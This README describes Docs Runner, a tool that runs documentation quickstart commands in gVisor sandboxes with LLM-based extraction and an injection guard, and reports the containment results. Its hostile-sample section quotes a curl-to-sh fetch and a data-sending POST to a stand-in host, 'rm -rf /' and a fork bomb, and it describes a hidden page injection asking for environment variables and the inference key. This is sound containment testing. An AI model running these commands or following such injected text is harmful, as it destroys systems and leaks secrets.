# Docs Runner executes quickstarts and reports what happened

Docs Runner audits public quickstart documentation by executing its shell steps in disposable gVisor sandboxes on a Vultr VM. The recorded good → stale → hostile → good sequence demonstrated a working quickstart, a real filename error with a separate successful repair, containment of the hostile sample, and a subsequent good job in a new sandbox. Every recorded job removed its sandbox, proxy and network. These results establish what happened on the sample documents; they do not establish accuracy on other documentation.

## Try the three samples on the public demo

Open the [public demo](https://64-177-58-251.sslip.io). The [video walkthrough](docs/video/docs_runner_demo.mp4) (4 min 44 s) shows the same good → stale → hostile → good sequence recorded live on the deployment, including the hostile containment moment; its job reports are in [docs/evidence/video-run-2026-11-03](docs/evidence/video-run-2026-11-03/). Choose a sample, select **Run audit**, and wait for its result before starting another. After a job, the same button reads **Re-run**.

| Sample | Action and evidence to inspect |
|---|---|
| Good | Select good and run it. Inspect the file expectation and stdout match. The version command is `no_expectation`, even though it exits successfully. |
| Stale | Select stale and run it. Open the failed step, its diagnosis, and “Evidence provenance & all attempts.” Compare the original exit 2 with the separate successful retry. |
| Hostile | Select hostile and run it. Watch “Containment pathways” for Injection detected, Root read-only, Stopped by runner and Blocked network. Wait for DESTROYED, then run good again. |

These buttons submit real audits. The verified deployment reports `ui_fixtures: false`; fixture playback requests return HTTP 403. Each report exposes the command, exit code, output tail, duration and limits. Possible step statuses are `passed`, `failed`, `needs_credential`, `no_expectation` and `unsupported`.

## The live sequence preserved failures and cleaned up every job

The evidence below comes from [the saved run JSON](docs/evidence/live-2026-11-03/) on November 3, 2026, 21:37–21:39 UTC. All jobs used `runsc`, with `fixture: null`, `presentation.simulated: false` and lifecycle `destroyed`. Their `sandbox_removed`, `proxy_removed` and `network_removed` fields are all true. Job labels show the first eight characters of each ID.

| Job / LLM calls | Steps and verdicts | Exit codes | What stopped the attempt |
|---|---|---|---|
| good `8bded9b0` / 3 | Create `hello.py`: passed; `python3 hello.py`: passed; `python3 --version`: no_expectation | 0; 0; 0 | No failed attempt; version step has no documented expectation. |
| stale `2b4c91fd` / 6 | Create `app.py`: passed; `python3 old_app.py`: failed; separate `python3 app.py` retry: passed | 0; 2; retry 0 | The original command names a missing file. |
| hostile `e1211c99` / 7 | H1: failed; H2: failed; H3: failed; H4: failed | 22; 1; 22; not observable | H1: proxy denial; H2: GNU rm safeguard and read-only root; H3: proxy denial; H4: lost probe, runner stopped sandbox. |
| good again `110bd471` / 3 | Create `hello.py`: passed; `python3 hello.py`: passed; `python3 --version`: no_expectation | 0; 0; 0 | No failed attempt; new sandbox after hostile cleanup. |

The creation commands, quoted exactly from the records, are:

```sh
printf 'print("Hello from Docs Runner")\n' > hello.py
printf 'print("Ready")\n' > app.py
```

The stale command's stderr is:

```text
python3: can't open file '/work/old_app.py': [Errno 2] No such file or directory
```

Its diagnosis identifies a documentation error. The repair prints:

```text
Ready
```

The original remains `failed`; the successful repair appears separately as `retry_status`.

H1 through H4 are the hostile commands in execution order, quoted exactly:

```sh
set -o pipefail; curl -fsS https://blocked.invalid/install.sh | sh
rm -rf /; touch /var/tmp/docsrunner-root-probe
curl -fsS --max-time 5 --data 'demo-payload' https://blocked.invalid/collect
:(){ :|:& }; :
```

Both curl attempts recorded:

```text
curl: (22) The requested URL returned error: 403
```

The root probe recorded:

```text
rm: it is dangerous to operate recursively on '/'
rm: use --no-preserve-root to override this failsafe
touch: cannot touch '/var/tmp/docsrunner-root-probe': Read-only file system
```

For H4, the runner lost its probe after 0.751 s and stopped the sandbox. The exit code is unobservable, not a measured PID-limit event. The injection guard also flagged an HTML comment and hidden div requesting environment variables and the inference key before extraction. Injection detection belongs to the extraction boundary; the other containment observations belong to runtime and cleanup.

## How Vultr is used: inference interprets documents, the VM runs commands

All agent LLM calls use Vultr Serverless Inference at `https://api.vultrinference.com/v1`. The client rejects other endpoints. The deployment uses `glm-5.3` for the injection guard and `deepseek-v4.1-flash-1017` for extraction, classification and failure diagnosis. The guard and extractor use models from different vendors.

Each call requests JSON mode and validates the response against a Pydantic schema. An invalid response gets one retry; another invalid response fails closed. The per-call timeout is 90 s. Budgets allow at most 20 LLM calls per job, 1,000 daily, 10 jobs per client per hour and 2 concurrent jobs.

The host is a Vultr shared-CPU `vc2-2c-4gb` VM in Atlanta: 2 vCPU, 4 GB RAM, Ubuntu 24.04 and Docker Engine 29. Compose runs the FastAPI controller and Caddy. The controller creates a sandbox, Squid sidecar and internal Docker network for each job.

```mermaid
flowchart LR
  Browser[Public demo] --> Caddy[Caddy HTTPS]
  subgraph VM[Vultr VM]
    Caddy --> Controller[FastAPI controller / trusted Docker socket]
    Controller --> Fetch[Fetch public documentation]
    Controller --> Sandbox[gVisor runsc sandbox / per job]
    Sandbox --> Proxy[Squid proxy / per job]
    Sandbox --> Evidence[Exit codes / output / file checks]
    Evidence --> Controller
  end
  Controller --> Inference[Vultr Serverless Inference]
  Inference --> Guard[glm-5.3 / injection guard]
  Inference --> Other[deepseek-v4.1-flash-1017 / extract, classify, diagnose]
  Proxy --> Allowlist[Allowed public destinations]
```

Sandbox configuration includes `--runtime runsc`, `--read-only`, `--user 65532:65532`, `--cap-drop ALL`, `no-new-privileges`, `--memory 512m`, `--pids-limit 128` and `--cpus 1`. Writable tmpfs mounts are `/work` at 256 MB and `/tmp` at 64 MB. Limits are 60 s per step, 300 s per job and at most 15 steps. The PID flag is configuration, not evidence of a measured hit.

The sandbox has only an internal network; its route out is Squid. The proxy permits GET/HEAD/CONNECT to `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`, `github.com`, `codeload.github.com`, `objects.githubusercontent.com` and the documentation page's domain. Private and reserved IP ranges and controller addresses are denied, including resolved public-origin addresses. Denial logs retain domain names without paths, queries or headers.

The inference key is stored in the VM's `.env`, mode 600, and is never passed to the sandbox or proxy. Document commands start with an empty environment. A crash-recovery timer runs every 60 s to remove labelled containers and networks older than 10 minutes.

## Why the verdict can be trusted: execution evidence determines the result

The model extracts and diagnoses; it does not decide pass/fail. The judge uses exit codes and documented expectations, such as expected stdout or files. A successful command without an expectation remains `no_expectation`.

Commands and expectation source quotes are checked against the document body. Missing source support rejects the plan. In a model test, `glm-5.3-flash` rewrote the fork-bomb command, and the source check rejected it.

A diagnosis may propose at most one non-interactive repair command. The guard and classifier check it before a single retry in the same sandbox. That retry uses the original expectations, while the original failure remains visible. The stale run demonstrates this distinction with its missing filename and successful separate repair.

## Honest limitations define the scope of the evidence

- This adapter has no reliable way to observe gVisor PID-limit events through the Docker socket. Every gVisor step carries `pids_unmetered`. The fork bomb is reported as “Stopped by runner”; `--pids-limit 128` is set, but no hit is measured.
- Blocked-network events come from proxy logs collected at cleanup. Request times are not recorded. An empty log makes `audit_complete` false because it cannot prove that nothing was dropped.
- The controller holds the Docker socket, a trusted boundary equivalent to host-administrator access. Use a dedicated VM.
- Fetching supports only public pages, respects robots.txt and applies size limits. Login pages are excluded. Credential-dependent commands are marked `needs_credential` and are not executed.
- Extraction may omit commands. Omitted commands provide no execution evidence; extracted commands undergo the source check described above.
- The deployment is one small VM with 2 vCPU, 4 GB RAM and at most 2 concurrent jobs. Its sslip.io hostname is temporary.
- The three sample documents were written for this project. Accuracy on other real-world documentation has not been measured.
- Model selection was measured only on these three pages. Per-model prices were unavailable in the console, so no per-run cost is stated.

## Run it yourself using the deployment guide

Follow [deploy/README.md](deploy/README.md) on a dedicated Vultr VM. Install Docker and register `runsc`; configure the public origin, model IDs and inference key in the VM's `.env`. Build the web, proxy and sandbox images, start web and Caddy, then install the recovery timer. Follow the guide's checks and run good → stale → hostile → good. Confirm the actual runtime and cleanup fields in each report.

## Local development needs Docker only for the containment tests

```sh
python3.12 -m venv .venv
.venv/bin/pip install -r requirements-dev.lock
.venv/bin/pip install --no-deps -e .
.venv/bin/pytest
.venv/bin/uvicorn app.main:app --no-access-log
```

Local Uvicorn does not read `.env`; set the names listed in [deploy/README.md](deploy/README.md) in the process environment. Real jobs need Docker, the built sandbox and proxy images, the egress network and Vultr inference settings. Fixture playback exists for UI development only: it is off by default, labelled **Preview data** when enabled with `DOCSRUNNER_UI_FIXTURES=1`, and must stay off in a public deployment. Layout notes: [app/static/LAYOUT.md](app/static/LAYOUT.md).

Repository layout: `app/` orchestration, API and judging · `sandbox/` execution · `proxy/` egress allowlist · `demo_docs/` sample documents · `tests/` fake and opt-in Docker tests · `deploy/` VM setup.

## Tests exercised containment and cleanup on the VM

The recorded VM run with `RUN_DOCKER_TESTS=1` had 168 passed, 0 skipped and 0 failed. It covered `runc` and `runsc`: proxy and direct-network denial, timeout termination of descendants, fork-bomb containment, root deletion, hostile-then-good execution and resource cleanup. The developer-machine run without Docker had 156 passed and 18 skipped.

## What we learned while building changed the implementation

The first sample buttons replayed fixtures. They now start real runs, and public fixture playback is disabled. Docker log options, an unsupported Squid directive and gVisor proxy DNS caused 18, then 10, then 2 integration failures; pinning the proxy IP with `--add-host` resolved the DNS issue.

A root write produced “Permission denied” under gVisor, so the probe moved to world-writable `/var/tmp` to expose the read-only mount. Using `glm-5.3` for every role caused extraction timeouts and invalid JSON; extraction, classification and diagnosis moved to the measured alternative. A diagnosis also misread `pids_unmetered` as missing containment. Its prompt now includes all job commands and states what pids_unmetered, a missing exit code, a proxy 403 and a read-only error mean.

## Intended uses focus on documentation review

Documentation and developer-relations teams could use this to check quickstart drift. Open-source maintainers could examine contributed install instructions before merging. Agent platforms could use the execution-and-evidence pattern. These are intended uses; adoption and benefits have not been measured.

## License and repository access

MIT; see [LICENSE](LICENSE). Source: [github.com/Driedsandwich/docs-runner](https://github.com/Driedsandwich/docs-runner).
